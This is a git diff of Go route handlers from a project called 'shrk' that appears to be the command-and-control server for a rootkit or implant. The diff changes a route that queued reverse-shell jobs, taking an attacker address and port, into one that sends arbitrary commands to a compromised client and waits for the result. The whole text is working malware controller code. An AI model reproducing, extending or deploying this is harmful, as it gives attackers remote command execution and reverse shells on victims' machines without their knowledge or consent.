@@ -2,7 +2,6 @@ package routes
 
 import (
 	"fmt"
-	"math"
 	"net/http"
 
 	"github.com/gofiber/fiber/v2"
@@ -12,14 +11,14 @@ import (
 	"github.com/ngn13/shrk/server/util"
 )
 
-func GET_shell(c *fiber.Ctx) error {
+func GET_run(c *fiber.Ctx) error {
 	client := c.Locals("client").(*database.Client)
-	return util.Render(c, "shell", fiber.Map{
+	return util.Render(c, "run", fiber.Map{
 		"client": client,
 	})
 }
 
-func POST_shell(c *fiber.Ctx) error {
+func POST_run(c *fiber.Ctx) error {
 	var (
 		client *database.Client
 		jobs   *joblist.Type
@@ -31,36 +30,31 @@ func POST_shell(c *fiber.Ctx) error {
 	jobs = c.Locals("joblist").(*joblist.Type)
 
 	body := struct {
-		Addr string `form:"addr"`
-		Port int    `form:"port"`
+		Cmd string `form:"cmd"`
 	}{}
 
 	if err = c.BodyParser(&body); err != nil {
 		return util.RenderErr(c, "invalid form data", http.StatusBadRequest)
 	}
 
-	if body.Port > math.MaxUint16 || 0 == body.Port {
-		return util.RenderErr(c, "invalid port number", http.StatusBadRequest)
-	}
-
-	data := util.NewBuffer(fmt.Sprintf("%s %d", body.Addr, body.Port))
+	data := util.NewBuffer(body.Cmd)
 	res := util.NewBuffer()
 
-	if job, err = jobs.Add(client.ID, joblist.CMD_SHELL, data, res); err != nil {
-		log.Fail("failed to add reverse shell job: %s", err.Error())
+	if job, err = jobs.Add(client.ID, joblist.CMD_RUN, data, res); err != nil {
+		log.Fail("failed to add command run job: %s", err.Error())
 		return util.RenderErr(c, "server error", http.StatusInternalServerError)
 	}
 
 	defer jobs.Del(job.ID)
 
 	if !job.Wait() {
-		log.Debg("reverse shell job timed out for %s", client.ID)
+		log.Debg("command run job timed out for %s", client.ID)
 		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
 	}
 
 	if res.String() != "success" {
 		return util.RenderErr(c, fmt.Sprintf(
-			"shell job failed: %s", res.String(),
+			"run job failed: %s", res.String(),
 		), http.StatusGatewayTimeout)
 	}
 
